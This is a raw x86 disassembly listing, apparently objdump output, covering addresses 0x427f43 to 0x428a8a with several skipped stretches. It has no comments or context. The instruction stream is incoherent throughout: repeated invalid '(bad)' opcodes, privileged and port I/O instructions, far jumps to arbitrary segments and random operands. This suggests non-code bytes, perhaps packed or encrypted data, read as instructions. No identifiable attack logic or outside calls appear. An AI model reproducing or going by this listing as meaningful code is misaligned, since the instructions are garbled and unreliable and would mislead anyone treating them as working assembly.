  427f43:	xor    DWORD PTR [esi],ebp
  427f45:	retf   
  427f46:	push   edi
  427f47:	xor    DWORD PTR [eax],edi
  427f49:	push   0x5cb67c1e
  427f4e:	gs inc ecx
  427f50:	or     DWORD PTR [edx],ebp
  427f52:	mov    al,ds:0xe01608d2
  427f57:	jl     0x427f4c
  427f59:	sub    BYTE PTR [eax],bh
  427f5b:	jle    0x427f44
  427f5d:	test   DWORD PTR [ecx+0x2d],eax
  427f60:	sub    dl,BYTE PTR [ecx+0x7d]
  427f63:	pop    es
  427f64:	mov    dh,0x49
  427f66:	add    al,0x17
  427f68:	fwait
  427f69:	std    
  427f6a:	push   ecx
  427f6b:	dec    edx
  427f6c:	rol    BYTE PTR [ecx+ecx*2+0x79919f74],1
  427f73:	(bad)  
  427f74:	(bad)  
  427f75:	aad    0x76
  427f77:	lahf   
  427f78:	cmp    edx,esi
  427f7a:	stc    
  427f7b:	dec    esi
  427f7c:	scas   eax,DWORD PTR es:[edi]
  427f7d:	cmp    dh,cl
  427f7f:	inc    ecx
  427f80:	imul   edi,DWORD PTR [ebx-0x6f7c7278],0x1f
  427f87:	add    eax,0x68724361
  427f8c:	mov    ch,0xc4
  427f8e:	push   esp
  427f8f:	push   eax
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	xchg   edx,eax
  428001:	ja     0x428066
  428003:	repz xor al,0xab
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	mov    fs,ecx
  42800e:	dec    esi
  42800f:	int    0x60
  428011:	xor    cl,BYTE PTR [esi+0xef6a915]
  428017:	arpl   WORD PTR [eax+0x61],dx
  42801a:	fst    QWORD PTR [ebp+0x65]
  42801d:	loope  0x42808b
  42801f:	ffree  st(6)
  428021:	mov    ebx,0x3f386368
  428026:	fsubr  DWORD PTR [eax+0x30]
  428029:	sbb    cl,0xaa
  42802c:	inc    edx
  42802d:	mov    edi,0x775729fd
  428032:	adc    bl,dh
  428034:	adc    ebx,ecx
  428036:	out    0xe6,al
  428038:	ret    0x2d45
  42803b:	xor    DWORD PTR [ebp+0x1eb896ee],eax
  428041:	xchg   esp,eax
  428042:	push   ebx
  428043:	cmp    esi,DWORD PTR [edx+0x6ab43b98]
  428049:	ret    
  42804a:	jns    0x4280c9
  42804c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42804d:	call   0xb8bc9f71
  428052:	inc    edi
  428053:	fnsave [ecx]
  428055:	into   
  428056:	mov    ds:0x86c87ebf,al
  42805b:	inc    ebp
  42805c:	in     al,dx
  42805d:	loope  0x427fe6
  42805f:	test   eax,0x7f45161d
  428064:	push   0xb1ff8770
  428069:	jmp    0xdc5a1f35
  42806e:	lods   al,BYTE PTR ds:[esi]
  42806f:	imul   edi,DWORD PTR [esi-0x68],0xffffffab
  428073:	imul   eax,DWORD PTR ds:0x2b249b55,0xfffffff6
  42807a:	mov    al,ds:0xadb0cacb
  42807f:	je     0x4280d8
  428081:	mov    al,ds:0x55406806
  428086:	clc    
  428087:	cmc    
  428088:	pusha  
  428089:	xchg   edx,eax
  42808a:	imul   ebx,DWORD PTR [edx+0x2a],0x18913b31
  428091:	call   0x3ade:0x3e35cde1
  428098:	stos   BYTE PTR es:[edi],al
  428099:	add    al,0x47
  42809b:	push   ecx
  42809c:	sti    
  42809d:	sti    
  42809e:	popa   
  42809f:	mov    ds:0xf7f76200,al
  4280a4:	or     al,dh
  4280a6:	adc    BYTE PTR [eax+0x3d0ac78],cl
  4280ac:	or     eax,0xe16a51f9
  4280b1:	lods   eax,DWORD PTR ds:[esi]
  4280b2:	ret    0x19cd
  4280b5:	rol    DWORD PTR [esi-0x61f4b8e7],0x95
  4280bc:	mov    eax,DWORD PTR [eax+eax*2+0x4bab9ba9]
  4280c3:	addr16 fwait
  4280c5:	aaa    
  4280c6:	xor    ebx,DWORD PTR [esi+0x56ed265c]
  4280cc:	mov    ebx,0xa7ce1532
  4280d1:	fcmovbe st,st(0)
  4280d3:	mov    fs,WORD PTR [ebp-0x4ea97762]
  4280d9:	pop    edx
  4280da:	add    eax,0x958b3272
  4280df:	push   eax
  4280e0:	cld    
  4280e1:	cmp    bl,BYTE PTR [esi+0x4d7f3a4e]
  4280e7:	mov    BYTE PTR [eax],al
  4280e9:	mov    cs,WORD PTR [eax+0x2c]
  4280ec:	outs   dx,DWORD PTR ds:[esi]
  4280ed:	pop    edi
  4280ee:	inc    ebx
  4280ef:	adc    dh,BYTE PTR [esi+ecx*2-0x8]
  4280f3:	in     al,dx
  4280f4:	pop    ss
  4280f5:	sbb    al,0xe8
  4280f7:	test   BYTE PTR [ecx+0xba1c76a],ah
  4280fd:	lds    ebx,FWORD PTR ds:0xac12b05d
  428103:	call   DWORD PTR [edi+0x131ebc60]
  428109:	les    ebp,FWORD PTR [edi+0x23]
  42810c:	mov    ah,0xb8
  42810e:	sar    esi,1
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	jo     0x428110
  428182:	cmp    eax,0x1ac38bd
  428187:	add    BYTE PTR [ecx+eax*1],al
  42818a:	add    BYTE PTR [eax],al
  42818c:	mov    esp,0x2fb89e67
  428191:	int3   
  428192:	xchg   esp,eax
  428193:	ficom  WORD PTR [ebp-0x6ae1d3d5]
  428199:	inc    ebx
  42819a:	daa    
  42819b:	scas   al,BYTE PTR es:[edi]
  42819c:	sub    BYTE PTR [eax+0x600af4e],dh
  4281a2:	mov    ds:0x94100ca8,eax
  4281a7:	pop    edx
  4281a8:	aas    
  4281a9:	enter  0x1c84,0x3f
  4281ad:	add    dl,al
  4281af:	sbb    edi,DWORD PTR [esi]
  4281b1:	xchg   esi,eax
  4281b2:	add    esi,edi
  4281b4:	call   0x7078:0x8a908edc
  4281bb:	out    dx,eax
  4281bc:	in     eax,dx
  4281bd:	sysret 
  4281bf:	mov    WORD PTR [eax],cs
  4281c1:	lods   eax,DWORD PTR ds:[esi]
  4281c2:	in     al,0xe0
  4281c4:	sub    DWORD PTR [ebp+edi*8-0x58],edi
  4281c8:	test   BYTE PTR [ecx+edi*8],cl
  4281cb:	shl    DWORD PTR [ebp+0x70ea0251],0xae
  4281d2:	out    0x8c,al
  4281d4:	test   eax,0x486ff001
  4281d9:	inc    ebx
  4281da:	(bad)  
  4281db:	dec    esp
  4281dc:	test   DWORD PTR [edi+0x38],esp
  4281df:	js     0x42820b
  4281e1:	icebp  
  4281e2:	ins    BYTE PTR es:[edi],dx
  4281e3:	mov    ecx,0xa8e0c09c
  4281e8:	fldcw  WORD PTR [eax+0x320a6c08]
  4281ee:	inc    edi
  4281ef:	jmp    0x727a7ae5
  4281f4:	mov    ah,0xf2
  4281f6:	jg     0x4281b9
  4281f8:	scas   al,BYTE PTR es:[di]
  4281fa:	and    DWORD PTR [edi+ebp*1-0x44f8ebaa],esp
  428201:	call   0xafea10e7
  428206:	cld    
  428207:	jo     0x428261
  428209:	or     DWORD PTR [edx+edx*2],esp
  42820c:	push   0xf2b54dc4
  428211:	mov    ecx,0x91e3de13
  428216:	cmc    
  428217:	mov    al,ds:0xcded00dc
  42821c:	lock in eax,dx
  42821e:	pop    ss
  42821f:	or     eax,0x9a74bbbe
  428224:	scas   al,BYTE PTR es:[edi]
  428225:	lods   eax,DWORD PTR ds:[esi]
  428226:	out    0xa9,eax
  428228:	dec    ecx
  428229:	iret   
  42822a:	sbb    DWORD PTR [ebx],edx
  42822c:	jns    0x428287
  42822e:	pop    esi
  42822f:	and    eax,0x44846c17
  428234:	push   eax
  428235:	fnsave [edi-0x12dcc9d2]
  42823b:	sub    edi,DWORD PTR [ecx-0x31039fe0]
  428241:	jo     0x4281d5
  428243:	mov    ds:0xcfd44d81,eax
  428248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428249:	xchg   BYTE PTR [ebp+eax*8+0x44c63623],bl
  428250:	into   
  428251:	adc    ecx,DWORD PTR [edi]
  428253:	les    edi,FWORD PTR [edi]
  428255:	and    eax,0xdfade7b
  42825a:	jns    0x42825b
  42825c:	cld    
  42825d:	mov    ch,0xcf
  42825f:	aaa    
  428260:	cmp    bh,BYTE PTR ds:0x1dc4e879
  428266:	sbb    dl,cl
  428268:	pushf  
  428269:	sub    DWORD PTR [ebp-0x2481f8de],edx
  42826f:	cld    
  428270:	cmp    BYTE PTR [esi+0x4d],bh
  428273:	mov    al,0x13
  428275:	jmp    0x678c:0x3fedb5
  42827c:	or     DWORD PTR [ebx-0x6c],ebp
  42827f:	into   
  428280:	mov    esp,0xc7275b24
  428285:	popa   
  428286:	mov    ebp,0x3db52189
  42828b:	sub    edi,ebp
  42828d:	or     DWORD PTR [edx+edx*4],esp
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	or     eax,0x3c2f04d5
  428305:	lods   eax,DWORD PTR ds:[esi]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	loope  0x42831f
  42830e:	mov    dh,0xbd
  428310:	ins    BYTE PTR es:[edi],dx
  428311:	mov    edx,0x96e73656
  428316:	aas    
  428317:	sbb    dl,ah
  428319:	jbe    0x42836f
  42831b:	jo     0x42835a
  42831d:	inc    esp
  42831e:	fst    st(3)
  428320:	pop    edi
  428321:	mov    esp,DWORD PTR [ecx]
  428323:	sbb    ecx,esp
  428325:	jne    0x428359
  428327:	cwde   
  428328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428329:	xchg   DWORD PTR [edx+0x33],ecx
  42832c:	je     0x428312
  42832e:	jp     0x42833b
  428330:	mov    WORD PTR [edi+0x512e63ff],gs
  428336:	mov    ecx,0xbfdbf6e8
  42833b:	mov    dh,0xb5
  42833d:	(bad)  
  42833e:	adc    DWORD PTR [edi+esi*8-0x66],esi
  428342:	clc    
  428343:	mov    ss:0xb400496,al
  428349:	mov    dh,0x3f
  42834b:	std    
  42834c:	mov    edi,0x7c6e46ef
  428351:	inc    esp
  428352:	fstp   DWORD PTR [edx-0x3]
  428355:	push   eax
  428356:	mov    al,ds:0x80e58086
  42835b:	jo     0x428351
  42835d:	stos   BYTE PTR es:[edi],al
  42835e:	je     0x428342
  428360:	xchg   BYTE PTR [edi],dh
  428362:	dec    eax
  428363:	mov    ecx,0x14aac06e
  428368:	lods   eax,DWORD PTR ds:[esi]
  428369:	enter  0xff51,0xd1
  42836d:	and    BYTE PTR [edi-0x2a7ca4b0],al
  428373:	pushf  
  428374:	rol    BYTE PTR ds:0x42fcaac2,0x38
  42837b:	mov    eax,ds:0xe6f4634a
  428380:	(bad)  
  428381:	sbb    cl,ch
  428383:	fwait
  428384:	out    dx,eax
  428385:	cld    
  428386:	sub    bl,bl
  428388:	cmp    cl,BYTE PTR [edi+0x24eadc6]
  42838e:	loop   0x428332
  428390:	sbb    eax,0x7274fb6b
  428395:	sbb    ecx,edx
  428397:	jmp    0x4283b0
  428399:	ins    BYTE PTR es:[edi],dx
  42839a:	mov    esp,0x29743c06
  42839f:	test   BYTE PTR [eax-0x692cae6c],ch
  4283a5:	stos   DWORD PTR es:[edi],eax
  4283a6:	call   0x36fdc836
  4283ab:	adc    DWORD PTR [ebp+0x2435941],ebx
  4283b1:	or     esp,edx
  4283b3:	aad    0x2d
  4283b5:	inc    eax
  4283b6:	jp     0x42840a
  4283b8:	je     0x428433
  4283ba:	test   eax,0xc9f1be08
  4283bf:	out    0xf1,eax
  4283c1:	ds pop ds
  4283c3:	xlat   BYTE PTR ds:[ebx]
  4283c4:	xchg   esp,eax
  4283c5:	xor    ebp,ecx
  4283c7:	xchg   edi,eax
  4283c8:	push   ds
  4283c9:	sbb    al,0xb7
  4283cb:	add    cl,BYTE PTR [eax-0x3b]
  4283ce:	aaa    
  4283cf:	jmp    0x42842b
  4283d1:	sub    DWORD PTR [edx-0x23],ecx
  4283d4:	pop    edx
  4283d6:	mov    esp,0x85f63b1e
  4283db:	fidiv  WORD PTR [edi]
  4283dd:	nop
  4283de:	push   ebx
  4283df:	nop
  4283e0:	pushf  
  4283e1:	arpl   WORD PTR [ebx+0x1d2fde25],di
  4283e7:	lds    ebp,FWORD PTR [eax+0x14585251]
  4283ed:	div    BYTE PTR [ebp-0x26620db]
  4283f3:	cld    
  4283f4:	inc    ecx
  4283f5:	and    al,0x93
  4283f7:	ffree  st(2)
  4283f9:	dec    ebx
  4283fa:	push   ecx
  4283fb:	in     eax,dx
  4283fc:	push   0xffffffd7
  4283fe:	in     eax,0xd0
  428400:	jecxz  0x428384
  428402:	mov    ah,0xf5
  428404:	aam    0x3f
  428406:	push   eax
  428407:	pop    edx
  428408:	pushf  
  428409:	sbb    DWORD PTR ds:0xa7e621d3,0x2
	...
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x57abfb32
  428481:	(bad)  
  428482:	bound  esi,QWORD PTR [edi+0x1ae40]
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	bswap  ebx
  42848e:	jl     0x428477
  428490:	test   BYTE PTR [esi],ah
  428492:	hlt    
  428493:	lahf   
  428494:	add    esi,DWORD PTR [edx]
  428496:	shr    DWORD PTR [edi+0x37bc9d24],0x77
  42849d:	mov    esi,0xbd4a9c34
  4284a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284a3:	dec    ebp
  4284a4:	pop    edi
  4284a5:	imul   dx,bp,0xc585
  4284aa:	push   0x46
  4284ac:	cwde   
  4284ad:	fdivp  st(2),st
  4284af:	add    al,0x36
  4284b2:	fs push ebp
  4284b4:	(bad)  
  4284b5:	icebp  
  4284b6:	(bad)  
  4284b7:	jmp    0x9ea0:0x36e77632
  4284be:	into   
  4284bf:	xchg   ebx,eax
  4284c0:	mov    cl,0xff
  4284c2:	xor    eax,DWORD PTR [ecx+ecx*2]
  4284c5:	cmp    bh,BYTE PTR [ecx]
  4284c7:	out    dx,eax
  4284c8:	mov    BYTE PTR [edi-0x2e2bef37],dh
  4284ce:	cmc    
  4284cf:	rcl    BYTE PTR [eax+eiz*2-0x71],cl
  4284d3:	mov    ch,0x56
  4284d5:	cmp    eax,0xbf36d3c
  4284da:	jne    0x4284e0
  4284dc:	mov    eax,ds:0xfd13da41
  4284e1:	loop   0x4284ef
  4284e3:	loope  0x42852e
  4284e5:	xor    DWORD PTR [ebp-0x25],ebp
  4284e8:	stos   DWORD PTR es:[edi],eax
  4284e9:	cmp    cl,BYTE PTR ds:0x25c54368
  4284ef:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284f1:	imul   edx,DWORD PTR ds:0xb3006845,0x5914c805
  4284fb:	or     DWORD PTR [edx+0x6ad94303],edi
  428501:	mov    eax,ds:0xc4ff96d2
  428506:	mov    ds:0xe108b09a,eax
  42850b:	mov    eax,0x3fb48ebc
  428510:	int    0xe8
  428512:	push   ecx
  428513:	mov    ds:0x922730b0,eax
  428518:	fsubr  QWORD PTR [ebp+ecx*8+0xc]
  42851c:	pop    ecx
  42851d:	or     DWORD PTR [esi+0x53427291],ebp
  428523:	or     DWORD PTR [eax],edx
  428525:	(bad)  
  428526:	call   0xd1a0:0xdcc4
  42852c:	fwait
  42852d:	hlt    
  42852e:	cmp    BYTE PTR [esi+ecx*2+0x268e4fb6],ch
  428535:	push   ds
  428536:	jbe    0x428535
  428538:	add    eax,0xe34cf75c
  42853d:	loopne 0x428509
  42853f:	push   0x9e12c2
  428544:	clc    
  428545:	and    al,BYTE PTR [edx-0x1d001227]
  42854b:	jns    0x428578
  42854d:	shr    BYTE PTR [esi+0x1430e18c],cl
  428553:	push   0x829c9c15
  428558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428559:	enter  0x2764,0x4d
  42855d:	ret    
  42855e:	ss push edx
  428560:	push   edx
  428561:	loop   0x428593
  428563:	aam    0x82
  428565:	sub    ecx,DWORD PTR [edx+0x230344e1]
  42856b:	fstp   QWORD PTR [edx]
  42856d:	mov    esi,0x58ff6ea6
  428572:	xchg   ecx,eax
  428573:	push   ebp
  428574:	mov    WORD PTR [edi+ecx*2],es
  428577:	int    0x5e
  428579:	outs   dx,DWORD PTR ds:[esi]
  42857a:	in     eax,dx
  42857b:	mov    ebx,0xbb510f95
  428580:	add    eax,0xd050d6cd
  428585:	(bad)  
  428586:	bound  ebp,QWORD PTR [ebx-0x6]
  428589:	addr16 xchg edx,eax
  42858b:	xchg   esp,eax
  42858c:	sub    eax,0xd56a03
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x8ae8a3f6
  428602:	rol    BYTE PTR ss:[edi+ebp*4+0x1],cl
  428607:	add    BYTE PTR [ecx+eax*1],al
  42860a:	add    BYTE PTR [eax],al
  42860c:	pop    ss
  42860d:	neg    DWORD PTR [edx]
  42860f:	retf   
  428610:	test   eax,0x780f03fe
  428615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428616:	xchg   edx,eax
  428617:	push   edx
  428618:	xchg   bh,al
  42861a:	aaa    
  42861b:	ror    cl,0x8
  42861e:	adc    BYTE PTR [eax],0xca
  428621:	xlat   BYTE PTR ds:[ebx]
  428622:	sub    eax,0xd1962eca
  428627:	mov    WORD PTR [eax],ds
  428629:	fstp   TBYTE PTR [edx]
  42862b:	call   0x77b3a307
  428630:	mov    ebx,0x5aa64a82
  428635:	push   ds
  428636:	jp     0x428687
  428638:	test   esp,ecx
  42863a:	inc    BYTE PTR [eax+ebp*8]
  42863d:	pop    esi
  42863e:	dec    esp
  42863f:	es fs xchg ecx,eax
  428642:	pop    ecx
  428643:	imul   esp,DWORD PTR [ebx-0x75cd2e32],0x3553768d
  42864d:	leave  
  42864e:	aam    0x59
  428650:	pop    ebp
  428651:	in     al,0xcc
  428653:	xchg   esi,eax
  428654:	cwde   
  428655:	daa    
  428656:	mov    al,0x12
  428658:	mov    ds:0x204b198,al
  42865d:	add    esp,DWORD PTR ds:[eax]
  428660:	cmp    BYTE PTR [eax],al
  428662:	rol    DWORD PTR [edi-0x7d],0x4c
  428666:	mov    dh,0xbe
  428668:	icebp  
  428669:	pusha  
  42866a:	jl     0x4286cc
  42866c:	push   ss
  42866d:	xor    ah,BYTE PTR [eax+0x4d]
  428670:	int    0x20
  428672:	sbb    cl,bh
  428674:	pop    ss
  428675:	aad    0x86
  428677:	pop    ds
  428678:	stos   BYTE PTR es:[edi],al
  428679:	fadd   DWORD PTR gs:[esi]
  42867c:	xor    eax,0xedae4c9d
  428681:	jmp    0x2f7d:0x139eaa05
  428688:	(bad)  
  428689:	in     eax,dx
  42868a:	fistp  DWORD PTR [esi-0x78]
  42868d:	mov    edx,0x7d5c730e
  428692:	adc    bl,BYTE PTR [esi-0x4bd8d54d]
  428698:	dec    ebp
  428699:	sub    al,0xbd
  42869b:	(bad)  
  42869c:	xlat   BYTE PTR ds:[ebx]
  42869d:	je     0x428694
  42869f:	dec    ebp
  4286a0:	setae  bh
  4286a3:	lock push ecx
  4286a5:	je     0x42867d
  4286a7:	cli    
  4286a8:	adc    BYTE PTR [eax+edx*1],ch
  4286ab:	xchg   edi,eax
  4286ac:	dec    ebx
  4286ad:	xor    dh,BYTE PTR [eax+0x14]
  4286b0:	pop    ecx
  4286b1:	mov    ecx,0x96cb9b4
  4286b6:	dec    esi
  4286b7:	cmp    ebx,edi
  4286b9:	in     eax,dx
  4286ba:	xchg   esi,eax
  4286bb:	fmul   DWORD PTR [eax]
  4286bd:	outs   dx,BYTE PTR ds:[esi]
  4286be:	jmp    0x7d632687
  4286c3:	push   ebx
  4286c4:	jae    0x42872e
  4286c6:	ficom  DWORD PTR [ebx]
  4286c8:	jno    0x42864d
  4286ca:	pusha  
  4286cb:	lea    edi,[edi-0x5a]
  4286ce:	add    bh,BYTE PTR [esi+0x4899e560]
  4286d4:	rol    DWORD PTR ds:0xdb8478fd,cl
  4286da:	pushf  
  4286db:	outs   dx,BYTE PTR ds:[esi]
  4286dc:	neg    BYTE PTR [edi]
  4286de:	mov    dh,0xc0
  4286e0:	lock lods al,BYTE PTR ds:[esi]
  4286e2:	sub    edi,ebp
  4286e4:	mov    cl,ch
  4286e6:	fiadd  DWORD PTR [esi]
  4286e8:	jge    0x428708
  4286ea:	mov    ds:0xeef9d0ad,al
  4286ef:	inc    eax
  4286f0:	sbb    esp,DWORD PTR [ecx-0x6]
  4286f3:	out    dx,al
  4286f4:	and    eax,0xfc7e3f82
  4286f9:	aas    
  4286fa:	adc    dl,BYTE PTR [edi+0x62dc3679]
  428700:	dec    BYTE PTR gs:0xc890
  428706:	shl    BYTE PTR [ebx],1
  428708:	aad    0x48
  42870a:	and    eax,0x89841e5d
  42870f:	xchg   ebx,eax
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xb6ab9796
  428783:	pop    ebp
  428784:	dec    eax
  428785:	mov    al,0x1
  428787:	add    BYTE PTR [ecx+eax*1],al
  42878a:	add    BYTE PTR [eax],al
  42878c:	das    
  42878d:	or     bl,0x9d
  428790:	(bad)
  428794:	dec    ebp
  428795:	in     al,0xb6
  428797:	push   ds
  428798:	imul   ebx,DWORD PTR [eax+0x4f],0x2c6ac172
  42879f:	cmp    eax,0xa15935bc
  4287a4:	mov    ds:0xc18645a8,al
  4287a9:	adc    BYTE PTR [ecx-0x74dca393],dh
  4287af:	dec    edi
  4287b0:	ss jmp 0x42881b
  4287b3:	shl    DWORD PTR [edx],0x13
  4287b6:	int3   
  4287b7:	in     al,dx
  4287b8:	iret   
  4287b9:	jle    0x4287ee
  4287bb:	out    0x29,eax
  4287bd:	jl     0x428740
  4287bf:	sub    eax,0x337ad1c4
  4287c4:	adc    BYTE PTR [esi+edx*1-0x634c3c39],0x99
  4287cc:	jns    0x4287cd
  4287ce:	mov    bl,0xbb
  4287d0:	test   eax,0x966befa0
  4287d5:	add    dh,BYTE PTR [edi-0x17]
  4287d8:	pop    ebp
  4287d9:	hlt    
  4287da:	imul   eax,DWORD PTR [ecx],0xba8367c2
  4287e0:	lea    esp,[ebx-0x6ec223ff]
  4287e6:	imul   ecx,esi,0x407f6bd7
  4287ec:	out    dx,eax
  4287ed:	lahf   
  4287ee:	call   0xcffd:0xeb3bc9d2
  4287f5:	loop   0x4287a1
  4287f7:	push   eax
  4287f8:	xchg   ecx,eax
  4287f9:	(bad)  
  4287fa:	cli    
  4287fb:	jge    0x42879e
  4287fd:	pop    ecx
  4287fe:	rcl    BYTE PTR [eax+eiz*8-0x47bb8735],cl
  428805:	sbb    BYTE PTR [esi-0x6e],ch
  428808:	xchg   esp,eax
  428809:	stos   DWORD PTR es:[edi],eax
  42880a:	fild   DWORD PTR [esi+eax*8-0x5970fac]
  428811:	mov    esi,0x4a3a3ec2
  428816:	sub    esi,DWORD PTR [ecx+0x45]
  428819:	retf   
  42881a:	sbb    DWORD PTR [ebx],eax
  42881c:	mov    ebp,0x9944404
  428821:	out    dx,eax
  428822:	jo     0x4287c7
  428824:	das    
  428825:	les    ebx,FWORD PTR [esi+0xa]
  428828:	xor    al,0xbe
  42882a:	xor    al,0xb4
  42882c:	and    al,0x23
  42882e:	cmp    al,0xd8
  428830:	iret   
  428831:	bnd jmp 0x49bf6ea
  428837:	xor    esp,DWORD PTR [edi+0x6242e1f0]
  42883d:	mov    ebx,0x38efbff7
  428842:	add    BYTE PTR [ecx+ebx*8],bh
  428845:	fsubr  st,st(1)
  428847:	and    esp,DWORD PTR [ecx+0x6f6142f8]
  42884d:	xchg   edx,eax
  42884e:	aas    
  42884f:	lods   al,BYTE PTR ds:[esi]
  428850:	add    DWORD PTR [edx],eax
  428852:	out    0x1b,ax
  428855:	sub    BYTE PTR [ecx+ebp*4-0x137d6c61],al
  42885c:	add    al,0x4e
  42885e:	mov    edi,ebp
  428860:	lods   al,BYTE PTR ds:[esi]
  428862:	outs   dx,DWORD PTR ds:[esi]
  428863:	or     eax,DWORD PTR [esi+eiz*2+0x44]
  428867:	and    al,0x98
  428869:	ins    DWORD PTR es:[edi],dx
  42886a:	mov    esi,0x1c6ecdb3
  42886f:	mov    ds:0xe4785c9c,eax
  428874:	(bad)  
  428876:	pushf  
  428877:	mov    bl,0x70
  428879:	sbb    esp,edi
  42887b:	cmp    BYTE PTR [ecx],ch
  42887d:	pop    edx
  42887e:	cdq    
  42887f:	and    DWORD PTR [ebx],edx
  428881:	adc    al,dh
  428883:	xchg   DWORD PTR [ecx-0x12],esp
  428886:	mov    cl,BYTE PTR [esi]
  428888:	pop    eax
  428889:	dec    ebp
  42888a:	mov    al,ds:0x9194d147
  42888f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x693962f1],bx
  428902:	mov    al,ds:0x1b14c07
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	add    al,0x84
  42890e:	push   0x6b
  428910:	aad    0xc1
  428912:	push   esp
  428913:	and    esi,DWORD PTR [ecx-0x77]
  428916:	add    DWORD PTR [ebx+0x3b4eeac6],0xfffffffb
  42891d:	or     al,0xdf
  42891f:	add    al,0x59
  428921:	add    DWORD PTR [ebp-0x24d19eb1],esp
  428927:	cmp    eax,0x7ffbc337
  42892c:	jg     0x4288b5
  42892e:	or     esp,esp
  428930:	ds into 
  428932:	sub    ecx,DWORD PTR [edi-0xb45be27]
  428938:	push   edi
  428939:	xchg   esp,eax
  42893a:	jae    0x428906
  42893c:	daa    
  42893d:	push   eax
  42893e:	or     ch,al
  428940:	stos   DWORD PTR es:[edi],eax
  428941:	(bad)  
  428943:	xchg   ecx,eax
  428944:	xor    DWORD PTR [esp+edi*2+0x68ad2648],edi
  42894b:	xor    eax,0xf6e78ed5
  428950:	or     al,0x60
  428952:	(bad)  
  428953:	(bad)  
  428954:	ds dec ebx
  428956:	mov    eax,gs:0x3a7e2cc6
  42895c:	and    eax,0x719a584e
  428961:	arpl   WORD PTR [eax],dx
  428963:	retf   0x6a2a
  428966:	sub    ecx,ecx
  428968:	stc    
  428969:	sub    al,bl
  42896b:	sbb    DWORD PTR [ebx-0x11],edx
  42896e:	or     dl,BYTE PTR [ebx+0x10e57e87]
  428974:	mov    gs,WORD PTR [eax+0x62]
  428977:	mov    bh,BYTE PTR cs:[eax+0x1244709b]
  42897e:	loopne 0x42893c
  428980:	dec    ebp
  428981:	jb     0x428962
  428983:	and    edi,DWORD PTR [ecx-0x79bc5bd]
  428989:	adc    DWORD PTR [ecx+0x43],0xadcdf572
  428990:	xchg   edx,eax
  428991:	outs   dx,BYTE PTR ds:[esi]
  428992:	sub    eax,0xb714cae4
  428997:	jl     0x42892f
  428999:	pop    ecx
  42899a:	push   cs
  42899b:	xchg   ebp,eax
  42899c:	add    eax,0x3e455aa2
  4289a1:	mov    ecx,0x849272cd
  4289a6:	xor    al,al
  4289a8:	push   cs
  4289a9:	mov    edx,DWORD PTR ds:0xdc7ed583
  4289af:	mov    ecx,0x458219c2
  4289b4:	cs push ds
  4289b6:	lahf   
  4289b7:	inc    ebp
  4289b8:	adc    al,BYTE PTR ds:[edx]
  4289bb:	(bad)  
  4289bc:	lock inc esi
  4289be:	aad    0xb3
  4289c0:	fbld   TBYTE PTR [eax-0x5d]
  4289c3:	popa   
  4289c4:	call   0x42482ab6
  4289c9:	outs   dx,BYTE PTR ds:[esi]
  4289ca:	enterw 0xe273,0xf5
  4289cf:	or     BYTE PTR ds:0x9b3e3dc3,al
  4289d5:	lahf   
  4289d6:	dec    ebp
  4289d7:	js     0x39238c8e
  4289dd:	inc    ecx
  4289de:	inc    esp
  4289df:	stos   DWORD PTR es:[edi],eax
  4289e0:	push   ecx
  4289e1:	and    eax,0xc97f54cf
  4289e6:	fadd   QWORD PTR [ebx]
  4289e8:	cld    
  4289e9:	ins    DWORD PTR es:[edi],dx
  4289ea:	leave  
  4289eb:	mov    al,ds:0x89dd5fe6
  4289f0:	aam    0x5
  4289f2:	jo     0x4289d3
  4289f4:	test   eax,0xc902cb07
  4289f9:	and    DWORD PTR [ecx+0x5b],edi
  4289fc:	mov    ah,0xd1
  4289fe:	lds    ebp,FWORD PTR [edi-0x3d]
  428a01:	jge    0x428a66
  428a03:	jecxz  0x4289d3
  428a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a06:	dec    eax
  428a07:	addr16 jge 0x428a86
  428a0a:	jge    0x428a31
  428a0c:	dec    ecx
  428a0d:	mov    ch,0x8b
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x184daf13]
  428a83:	dec    eax
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
